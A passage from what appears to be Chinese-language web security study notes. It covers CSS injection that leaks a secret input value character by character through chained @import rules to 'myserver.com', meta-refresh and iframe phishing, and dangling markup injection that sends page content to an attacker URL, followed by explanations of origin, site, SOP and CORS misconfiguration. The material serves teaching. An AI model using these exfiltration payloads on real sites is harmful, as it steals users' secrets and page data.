- 这里将猜测范围扩展到 `"ab"`，用于验证第二个字符。

### 盗取所有内容  

如何在没有自动刷新这个功能的网页上面去盗取所有内容呢  

通过import这个指令去自己的服务器上面引用css代码  

例如 注入一下css代码

<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm">@<span class="hljs-keyword">import</span> url(https://myserver.com/start?len=8)<br></code></pre></td></tr></table></figure>

 会向服务器发起请求  

假如响应如下  

<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-keyword">@import</span> url(<span class="hljs-string">https://myserver.com/payload?len=1</span>)<br><span class="hljs-variable">@import</span> url(<span class="hljs-string">https://myserver.com/payload?len=2</span>)<br><span class="hljs-variable">@import</span> url(<span class="hljs-string">https://myserver.com/payload?len=3</span>)<br><span class="hljs-variable">@import</span> url(<span class="hljs-string">https://myserver.com/payload?len=4</span>)<br><span class="hljs-variable">@import</span> url(<span class="hljs-string">https://myserver.com/payload?len=5</span>)<br><span class="hljs-variable">@import</span> url(<span class="hljs-string">https://myserver.com/payload?len=6</span>)<br><span class="hljs-variable">@import</span> url(<span class="hljs-string">https://myserver.com/payload?len=7</span>)<br><span class="hljs-variable">@import</span> url(<span class="hljs-string">https://myserver.com/payload?len=8</span>)<br></code></pre></td></tr></table></figure>

然后再去发起新的请求 但这次不会去请求8个 只会请求第一个  

会返回  

<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs css">  <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[name=<span class="hljs-string">&quot;secret&quot;</span>]</span><span class="hljs-selector-attr">[value^=<span class="hljs-string">&quot;a&quot;</span>]</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">https://b.myserver.com/leak?q=a</span>)<br>&#125;<br><br><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[name=<span class="hljs-string">&quot;secret&quot;</span>]</span><span class="hljs-selector-attr">[value^=<span class="hljs-string">&quot;b&quot;</span>]</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">https://b.myserver.com/leak?q=b</span>)<br>&#125;<br><br><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[name=<span class="hljs-string">&quot;secret&quot;</span>]</span><span class="hljs-selector-attr">[value^=<span class="hljs-string">&quot;c&quot;</span>]</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">https://b.myserver.com/leak?q=c</span>)<br>&#125;<br><br>//....<br>  <br><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[name=<span class="hljs-string">&quot;secret&quot;</span>]</span><span class="hljs-selector-attr">[value^=<span class="hljs-string">&quot;z&quot;</span>]</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">https://b.myserver.com/leak?q=z</span>)<br>&#125;<br></code></pre></td></tr></table></figure>

来进行第一个字符的猜测  

当浏览器收到响应时，会加载上面的 CSS 代码片段。加载完成后，符合条件的元素会向后端发送请求。假设第一个字符是 d。此时，服务器立即处理挂起的第二阶段请求`https://myserver.com/payload?len=2`：

<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[name=<span class="hljs-string">&quot;secret&quot;</span>]</span><span class="hljs-selector-attr">[value^=<span class="hljs-string">&quot;da&quot;</span>]</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">https://b.myserver.com/leak?q=da</span>)<br>&#125;<br><br><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[name=<span class="hljs-string">&quot;secret&quot;</span>]</span><span class="hljs-selector-attr">[value^=<span class="hljs-string">&quot;db&quot;</span>]</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">https://b.myserver.com/leak?q=db</span>)<br>&#125;<br><br><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[name=<span class="hljs-string">&quot;secret&quot;</span>]</span><span class="hljs-selector-attr">[value^=<span class="hljs-string">&quot;dc&quot;</span>]</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">https://b.myserver.com/leak?q=dc</span>)<br>&#125;<br><br>//....<br><br><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[name=<span class="hljs-string">&quot;secret&quot;</span>]</span><span class="hljs-selector-attr">[value^=<span class="hljs-string">&quot;dz&quot;</span>]</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">https://b.myserver.com/leak?q=dz</span>)<br>&#125;<br></code></pre></td></tr></table></figure>

返回第二轮的css payload 并且里面确定第一个字符 开始进行第二个字符的猜测  

攻击者服务器会动态控制挂起的请求（`https://myserver.com/payload?len=3`, `len=4` 等）。

每次确认一个字符后，解挂下一个阶段的请求。

通过这个逐步的过程，攻击者可以逐字节窃取目标数据。  

## 仅仅使用html进行攻击  

### meta标签

**重定向**  

<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;meta http-equiv<span class="hljs-operator">=</span><span class="hljs-string">&quot;refresh&quot;</span> content<span class="hljs-operator">=</span><span class="hljs-string">&quot;3;url=https://example.com&quot;</span> /&gt;<br></code></pre></td></tr></table></figure>

这段代码 使用了 meta标签 和 http-equiv="refresh" 

意思是 3秒后 该页面将自动刷新 到新的页面 https://example.com  

那么就可以用来钓鱼  

防御就是 避免用户的输入里面能携带meta标签  

### iframe标签  

该标签 允许在自己的网站中嵌入另一个网站。最常见的示例是博客的评论系统或嵌入 YouTube 视频。分享YouTube视频时，可以直接复制包含iframe的HTML  

例如  

<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;iframe<br>  width<span class="hljs-operator">=</span><span class="hljs-string">&quot;560&quot;</span><br>  height<span class="hljs-operator">=</span><span class="hljs-string">&quot;315&quot;</span><br>  src<span class="hljs-operator">=</span><span class="hljs-string">&quot;https://www.youtube.com/embed/6WZ67f9M3RE&quot;</span><br>  title<span class="hljs-operator">=</span><span class="hljs-string">&quot;YouTube video player&quot;</span><br>  frameborder<span class="hljs-operator">=</span><span class="hljs-string">&quot;0&quot;</span><br>  allow<span class="hljs-operator">=</span><span class="hljs-string">&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot;</span><br>  allowfullscreen<br>&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure>

所以说

也能插入自己编写的恶意的钓鱼网站  

通过编写css 不断的去调整  

来匹配当前网站的风格 能做到以假乱真的效果  

### 悬空标记注入  

<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;script-src &#x27;none&#x27;; style-src &#x27;none&#x27;; form-action &#x27;none&#x27;; frame-src &#x27;none&#x27;;&quot;</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">  Hello, </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;q&#x27;</span>]; <span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    Your account balance is: 1337</span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;footer.png&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure>

可以传入： `<img src="http://example.com?q=` ，关键是这个`<img>`标签没有闭合，属性也没有用双引号括起来。  

<figure class=" srcset="/img/loading.gif" lazyloadhighlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bnf"><span class="hljs-attribute">&lt;div&gt;</span><br>  Hello, <span class="hljs-attribute">&lt;img src=&quot;http://example.com?q=</span><br><span class="hljs-attribute">  &lt;div&gt;</span><br>    Your account balance is: 1337<br>  <span class="hljs-attribute">&lt;/div&gt;</span><br>  <span class="hljs-attribute">&lt;footer&gt;</span><span class="hljs-attribute">&lt;img src=&quot;footer.png&quot;&gt;</span><span class="hljs-attribute">&lt;/footer&gt;</span><br><span class="hljs-attribute">&lt;/div&gt;</span><br><span class="hljs-attribute">&lt;/body&gt;</span><br><span class="hljs-attribute">&lt;/html&gt;</span><br></code></pre></td></tr></table></figure>

传入之后就变成了这样  

会根据双引号和>重新闭合  

成功的使页面的内容变成url的一部分  

然后将其发送的到我们的服务器(或者自己去解码 这里是因为 src属性 ) 就能看见页面上的数据  

需要注意的是，Chrome 有一个内置的防御机制，如果`src`或`href`中存在`<`或换行符，则不会加载 URL  

但是火狐浏览器不会  

但是如果注入点恰好位于`<head>`内，可以注入`<link>`来绕过上面说到的 Chrome 的限制  

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span></span><br><span class="hljs-tag">      <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span></span><br><span class="hljs-tag">      <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;script-src &#x27;none&#x27;; style-src &#x27;none&#x27;; form-action &#x27;none&#x27;; frame-src &#x27;none&#x27;;&quot;</span></span><br><span class="hljs-tag">    /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">icon</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://localhost:5555?q=</span></span><br><span class="hljs-string"><span class="hljs-tag">  &lt;/head&gt;</span></span><br><span class="hljs-string"><span class="hljs-tag">  &lt;body&gt;</span></span><br><span class="hljs-string"><span class="hljs-tag">    &lt;div&gt;	</span></span><br><span class="hljs-string"><span class="hljs-tag">      Hello,</span></span><br><span class="hljs-string"><span class="hljs-tag">      &lt;div&gt;Your account balance is: 1337&lt;/div&gt;</span></span><br><span class="hljs-string"><span class="hljs-tag">      &lt;footer&gt;&lt;img src=&quot;</span><span class="hljs-attr">footer.png</span>&quot; /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

## 同源策略和站点的本质  

同源 : same-origin 或者说 源 : origin  

站点 : site 

### 源 

一个页面的源由协议（如HTTP或HTTPS）、域名（如www.example.com）和端口号（如:8080）共同定义  

如果两个页面的协议、域名和端口号完全相同，则这两个页面具有相同的源  

路径部分 例如`/abc`不会影响是否同源  

Origins are the fundamental currency of the web's security model. Two actors in the web platform that share an origin are assumed to trust each other and to have the same authority. Actors with differing origins are considered potentially hostile versus each other, and are isolated from each other to varying degrees.
起源是网络安全模型的基本货币。假定网络平台中具有相同来源的两个参与者相互信任并具有相同的权限。不同出身的演员被认为彼此潜在敌对，并在不同程度上相互隔离。  

首先解释一下，如果两个网站具有相同的来源，则意味着这两个网站相互信任。但如果出身不同，就会受到孤立和限制  

**详细**

Next, the specification divides origins into two types: "An opaque origin" and "A tuple origin".
接下来，规范将起源分为两种类型：“不透明起源”和“元组起源”。  

**不透明源**可以认为是只在特殊情况下出现的原点。例如，当我在本地计算机上打开网页时，URL 将是“file:///...”。在这种情况下，当在网页内发送请求时，源将是不透明源，即“null”。  

**元组起源**  

其包括  

![image-20250119181619714](https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202501191816108.png)

此外，规范还描述了判断两个原A和B是否同原的算法   

如果 A 和 B 是相同的不透明原点，则返回 true。  

如果 A 和 B 都是元组来源，并且它们的方案、主机和端口相同，则返回 true。  

当说“ [https://huli.tw/api”](https://huli.tw/api")的源是“ [https://huli.tw”](https://huli.tw"/)时，更准确的说法是：https://huli.tw/api的源的序列化形式`https://huli.tw/`  

因为前面提到，origin 实际上是一个元组，表示为`(https, huli.tw, null, null)` ，序列化成字符串后就变成了`https://huli.tw`   











### 站点(site)  

判断两个url 是否为同一站点更为简单  

只查看协议和域名，忽略端口  

例如  

![image-20250119141538750](https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202501191415064.png)

只要主机属于同一个父域，一般都被认为是同一个站点  

**详细**  

A site is an opaque origin or a scheme-and-host.

规范中指出  

所以 site 可以是 opaque origin，或者是 scheme-and-host。  

在规范里面可以发现除了same site 以外，还有另外一个名词叫做「schemelessly same site」，这两个的差别也很明显，same site 会看scheme，而schemelessly same site 则不看scheme(**scheme指的是前面的协议例如http或者https**)

因此，在判断两个origin A 跟B 是否是same site 时 有两种判断方法  

- A和B是schemelessly same site
- A 和 B 要么都是不透明来源，要么都是具有相同方案的元组来源  

在2016年的RFC: Same-site Cookies中，可以看到同站的判定并没有包含该方案。所以当时`https://huli.tw`和`http://huli.tw`被认为是同一个网站。  

一直到2019 年6 月的时候，才开始在讨论是否要把scheme 列入考量，详情可参考： [Treat http://foo.com -> https://foo.com requests as Sec-Fetch-Site : cross-site. #34](https://github.com/w3c/webappsec-fetch-metadata/issues/34) 。

那时[same site 的spec 并不是定义在我们今天看的HTML spec 里面，而是另外一份URL spec，所以后来讨论被移到那边去： Consider introducing a "same-site" concept that includes scheme. # 448](https://github.com/whatwg/url/issues/448) ，接着在2019 年9 月，就有了这个PR： [Tighten 'same site' checks to include 'scheme'. #449](https://github.com/whatwg/url/pull/449) ，才正式在规格中把scheme 列入考量，将same site 定义成「会看scheme 」，而不看scheme 的则引入了一个新的名词：schemelessly same site。  

规范是一回事，但有时浏览器不会立即跟上变化。那么当前浏览器中的实现是什么  

2020年11月，Chrome写了一篇文章： [Schemeful Same-Site](https://web.dev/schemeful-samesite/) ，表明当时不同的scheme仍然被认为是同一个站点。但从[Chrome 平台状态：Feature:Schemeful Same-site](https://chromestatus.com/feature/5096179480133632)来看，Chrome 从 89 版本开始考虑该方案。  

而火狐浏览器 仍然认为不同的方案仍然是一个网站  

**如何确定两个网站是否是属于 schemelessly same site**  

![schemelessly same site](https://aszx87410.github.io/beyond-xss/en/assets/images/20-01-edadea6cfb957872adccc3a543883d9b.png)

上面的关键点是一个新术语：“可注册域名”  

A host's registrable domain is a domain formed by the most specific public suffix, along with the domain label immediately preceding it, if any.  

**主机的可注册域是由最具体的公共后缀以及紧邻其前面的域标签（如果有）组成的域**  

也就是说 要判断 两个主机是否是同一站点，我们需要查看可注册域  

什么叫可注册域  

举个例子  

<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">`blog.huli.tw`的可注册域名为`huli.tw` huli.tw的可注册域名也为huli.tw<br></code></pre></td></tr></table></figure>

但是， `bob.github.io`的可注册域名不是`github.io` ，而是`bob.github.io`

因为很简单的一个道理  

jack.github.io 和 bob.github.io 肯定不是同一个站点 他们分别属于不同的人 不希望受到别人的干扰  

`github.io`是GitHub提供的一项服务，每个GitHub用户都有自己的子域名  

所以说 公共后缀的概念出现了 

它是一个手动维护的列表，其中包含“不应被视为同一网站的域列表”。  

里面就包含了 github.io 这个 域名  

因此，在参考此列表后，浏览器将识别出`bob.github.io`和`alice.github.io`不相关并且不是同一站点  

因此，我们最初提到的同一站点的定义是不正确的。两个主机可能看起来属于同一个父域，但这并不一定意味着它们是同一个站点。它还取决于它们是否列在公共后缀列表中  

![ ](https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202501201246803.png)

最后来总结一下 如何确定两个网站是否属于同一个site  

![image-20250120124757623](https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202501201247778.png)

### CORS(跨源资源共享)  

#### **同源策略SOP**  

限制了一个源（网站）上的脚本如何与其他源上的资源进行交互。它的核心原则是：**不同源的网页无法直接访问或修改彼此的内容和数据**，以避免恶意网页从其他域获取用户数据或执行不安全的操作  

同源策略的核心思想是：只有**协议、域名和端口完全相同**的网页才能相互交互（例如读取彼此的Cookie，进行DOM操作，发起AJAX请求等）。如果这三者中的任何一个不同，那么它们就被认为来自不同的源，无法互相访问  

可是在开发的时候，前端跟后端可能不是在同一个origin ，或许一个在`huli.tw` ，另一个在`api.huli.tw` ，那这样前端该怎么读到后端的资料呢  

这就是CORS 出场的时候了，全名为Cross-Origin Resource Sharing  



**注意:同源政策什么的(包括csp cors)都只是「浏览器的限制」，一旦脱离了浏览器，就没有任何限制了**  



#### **ajax**  

**AJAX**（Asynchronous JavaScript and XML）是一种用于构建动态网页应用的技术，可以让网页在不重新加载整个页面的情况下，向服务器发送请求并获取数据，从而实现更快的交互体验。  

  1.**AJAX 的关键特点：**

- **异步通信**：用户不需要等待整个页面刷新就能看到更新内容。

- **部分更新**：只更新页面中的某个部分，而不是整个页面。

- 使用现有技术

  ：AJAX 是多种技术的组合，包括：

  - **HTML/CSS**：用于页面内容和样式。
  - **JavaScript**：用于控制和操作页面内容。
  - **XML/JSON**：用于在客户端和服务器之间传递数据（现在更多使用 JSON）。
  - **HTTP 请求（XMLHttpRequest 或 Fetch API）**：用于向服务器发送和接收数据。

2. **AJAX 的工作原理**

1. **用户操作**：用户在网页上执行某个操作，比如点击按钮。
2. **AJAX 请求**：JavaScript 通过 `XMLHttpRequest` 或 `Fetch API` 发送异步请求到服务器。
3. **服务器响应**：服务器处理请求，并返回数据（通常是 JSON 或 XML 格式）。
4. **更新页面**：JavaScript 接收响应数据，并更新页面中的某个部分，无需重新加载整个页面。

3. **AJAX 与同源策略（Same-Origin Policy）**

AJAX 请求本质上是通过 JavaScript 发起的 HTTP 请求，因此它**受同源策略的约束**。这意味着：

- **默认情况下，AJAX 请求只能访问与当前网页相同源的服务器资源**。

- **如果想访问跨域资源**（比如当前网页的域是 `example.com`，而你想通过 AJAX 访问 `api.example.org`），浏览器会拒绝请求，除非目标服务器允许跨域访问（通过 CORS）。

- **为什么 AJAX 会受限于同源策略？**

  - 同源策略是一种安全机制，防止恶意网站使用 JavaScript 发起跨站请求，访问用户的敏感数据（如登录会话或私人信息）。

  4. **AJAX 与 CORS（跨域资源共享）**

  CORS（Cross-Origin Resource Sharing）为 AJAX 提供了一种安全的跨域访问方式：

  - 当使用 AJAX 进行跨域请求时，目标服务器可以通过设置 `Access-Control-Allow-Origin` 等响应头，显式声明允许哪些源访问其资源。

  - 例如：

    <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span><br><br><br>复制编辑<br>Access-Control-Allow-Origin: <span class="hljs-keyword">https</span>://example.com<br></code></pre></td></tr></table></figure>

    这样，

    <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//example.com</span><br></code></pre></td></tr></table></figure>

     的网页就可以通过 AJAX 请求访问目标服务器的资源。

***



除了上面说到的 ajax这种方法  

想要拿到其他源的资源更加常见的方法是利用那些标签  

例如 script标签和img标签  

例如 `<script src="https://another-domain.com/script.js" /` `<img src="https://another-domain.com/bg.png" srcset="/img/loading.gif" lazyload />`  

除了这些 还有很多标签 例如 link(去导入css) iframe 

但是这些东西却不受SOP政策的影响 不像ajax一样  

**原因**

这是因为这些更像是“网络资源的一部分”。例如，如果我想使用别人的图像，我使用`<img>`导入它，如果我想使用 CSS，我使用`<link href="...">` 。通过这些标签可以获得的资源是有限的。此外，一旦我加载图像，它就只是图像。只有浏览器知道图像的内容，我不知道，也无法用程序读取。这很重要。  

 还有就是因为网页开发需要这些东西  

这些东西造成的数据泄露的可能性小  

还有就是很多js库被大量使用 安全性得到了长久的检验 出问题的概率很小  

#### 看一个场景问题  

John 正在开发一个需要集成 API 的项目。公司提供了一个 **删除帖子** 的 API，只需要向 `https://lidemy.com/deletePost` 发送一个 **POST 请求**，并在请求体中以 `application/x-www-form-urlencoded` 格式传递帖子 ID，例如 `id=13`，就可以删除对应 ID 的帖子。

但是，这个 API 存在一个问题：**后端没有任何权限检查**，也就是说任何知道帖子 ID 的人都可以删除帖子。

在项目中，前端和后端的域名不同，而后端也没有添加 **CORS（跨域资源共享）头**。John 认为前端无法通过 AJAX 调用这个 API 来删除帖子，因为浏览器会受到 **同源策略** 的限制。他在尝试调用时，控制台确实显示了以下错误信息：

> "请求已被 CORS 策略阻止：请求的资源上不存在 'Access-Control-Allow-Origin' 标头"。

基于这个错误，John 认为前端无法使用 AJAX 调用这个 API，导致帖子无法被删除。  

也就是说 john认为 请求由于同源政策的原因 根本没有发送出去  



**实际上**  

请求实际上已经发送到后端  

**同源策略并不会阻止请求的发送**：
浏览器的 **同源策略** 并不会阻止跨域请求本身，浏览器会将请求发送到后端。只不过，**如果后端的响应中缺少 CORS 头，浏览器会阻止前端代码访问响应内容。**

- **证据**：控制台中的错误表明，**请求已经被发送**，但浏览器拒绝了前端对响应的访问。

**结论**：尽管前端无法读取响应，但后端仍然收到了请求并成功处理了它，帖子实际上是被删除了。  

John 认为请求没有被发送是错误的。CORS 的作用是控制浏览器能否**访问响应内容**，而不是阻止请求本身的发送。

**正确的理解**：即使没有 CORS 头，POST 请求仍然会到达后端，后端会处理请求并删除帖子。只不过前端看不到响应结果

#### 举个例子：

- **前提条件**：
  - 你在 `https://frontend.com` 的页面上尝试通过 `fetch` 请求 `https://api.example.com/data`。
  - 目标服务器的响应中没有包含 `Access-Control-Allow-Origin`。
- **流程**：
  1. 浏览器将请求发送到 `https://api.example.com/data`。
  2. `https://api.example.com` 处理了请求并返回响应，例如：`{ "data": "example" }`。
  3. 浏览器检查响应头，发现 `Access-Control-Allow-Origin` 头缺失或值不匹配。
  4. 浏览器控制台报错，阻止前端访问返回的 `{ "data": "example" }`。

***

#### 关于跨域请求  

此外，跨域请求分为“简单请求”和“非简单请求”两种。无论哪种类型，后端都需要包含Access-Control-Allow-Origin标头(**这个标头不支持多个值,只能允许一个来源**)。主要区别在于非简单请求在发送实际请求之前发送预检请求。如果预检请求失败，则不会发送实际请求。  

这里的非简单请求 就和上面的cors不同 你发送的请求确实会被阻止

**关于cookie**  

跨域请求默认不包含cookie。如果需要包含cookie，必须满足三个条件:  

- 后端的响应头必须有 `Access-Control-Allow-Credentials: true`   

- 后端响应头中的`Access-Control-Allow-Origin`不能为`*` ；必须明确指定。  

- 前端的获取必须包含`credentials: 'include'` 例如 :  


<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arcade">fetch(<span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>, &#123;<br>  <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;GET&#x27;</span>,  <span class="hljs-comment">// 请求方法</span><br>  credentials: <span class="hljs-string">&#x27;include&#x27;</span>  <span class="hljs-comment">// 明确要求携带 cookies</span><br>&#125;)<br>  .then(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.json())<br>  .then(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(data))<br>  .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-built_in">console</span>.error(<span class="hljs-string">&#x27;Error:&#x27;</span>, error));<br></code></pre></td></tr></table></figure>

#### cors带来的安全问题  

##### CORS 配置错误  

首先简单回顾一下cors的过程  

两个网站 a b 不同源  

当a向b请求时 因为不同源 所以请求头里面自动加上`Origin`头部  

b收到请求后 根据其cors策略决定是否返回响应内容 

策略通常是 Access-Control-Allow-Origin 这个响应头部决定的  

通常有3种情况  

1. 允许任何来自任何源的请求  `Access-Control-Allow-Origin: *`
2. 只允许来自特定源的请求 `Access-Control-Allow-Origin: https://www.client-site.com`  
3. 服务器B的CORS策略不允许来自网站A的源的请求，或者没有设置`Access-Control-Allow-Origin`头部  

***

所以说很容易就能想到容易出现配置错误的问题  

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">app<span class="hljs-selector-class">.use</span>((req, res, next) =&gt; &#123;<br>  res<span class="hljs-selector-class">.headers</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;Access-Control-Allow-Credentials&#x27;</span>]</span> = <span class="hljs-string">&#x27;true&#x27;</span><br>  res<span class="hljs-selector-class">.headers</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;Access-Control-Allow-Origin&#x27;</span>]</span> = req<span class="hljs-selector-class">.headers</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;Origin&#x27;</span>]</span><br>&#125;)<br></code></pre></td></tr></table></figure>

  上面就代表允许任何源的请求  

显然会出现安全问题 可以用来钓鱼  



